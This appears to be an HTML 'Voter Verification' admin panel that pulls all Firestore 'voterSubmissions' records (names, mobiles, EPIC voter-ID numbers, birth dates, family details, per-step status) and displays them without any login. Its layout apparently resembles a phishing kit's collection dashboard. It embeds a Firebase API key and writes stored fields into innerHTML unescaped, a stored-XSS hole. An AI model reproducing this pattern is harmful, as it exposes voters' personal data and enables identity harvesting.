<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Voter Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #f4f7f6; padding: 20px; }
        h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
        .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        table { width: 100%; border-collapse: collapse; min-width: 1000px; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
        th { background-color: #0056b3; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        .loading { text-align: center; color: #666; font-style: italic; }
    </style>
</head>
<body>

    <h2>Admin Panel - Live Complete Voter Submissions</h2>
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Full Name</th>
                    <th>Mobile</th>
                    <th>EPIC Number</th>
                    <th>Father's Name</th>
                    <th>DOB</th>
                    <th>Gender</th>
                    <th>Marital Status</th>
                    <th>Children</th>
                    <th>Current Step / Status</th>
                </tr>
            </thead>
            <tbody id="dataTable">
                <tr><td colspan="10" class="loading">Loading data from Firebase...</td></tr>
            </tbody>
        </table>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function loadSubmissions() {
            const tableBody = document.getElementById('dataTable');

            try {
                const querySnapshot = await getDocs(collection(db, "voterSubmissions"));
                tableBody.innerHTML = "";
                
                if (querySnapshot.empty) {
                    tableBody.innerHTML = "<tr><td colspan='10' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
                    return;
                }

                querySnapshot.forEach((doc) => {
                    const data = doc.data();
                    let row = `<tr>
                        <td>${data.time || 'N/A'}</td>
                        <td>${data.fullname || 'N/A'}</td>
                        <td>${data.mobile || 'N/A'}</td>
                        <td>${data.epic || 'N/A'}</td>
                        <td>${data.fatherName || 'Pending'}</td>
                        <td>${data.dob || 'Pending'}</td>
                        <td>${data.gender || 'Pending'}</td>
                        <td>${data.maritalStatus || 'Pending'}</td>
                        <td>${data.childrenCount || 'Pending'}</td>
                        <td><b>${data.currentStep || 'Started'}</b></td>
                    </tr>`;
                    tableBody.innerHTML += row;
                });
            } catch (error) {
                console.error("Error loading data: ", error);
                tableBody.innerHTML = "<tr><td colspan='10' class='loading' style='color:red;'>डेटा लोड करने में त्रुटि।</td></tr>";
            }
        }

        loadSubmissions();
    </script>
</body>
</html>
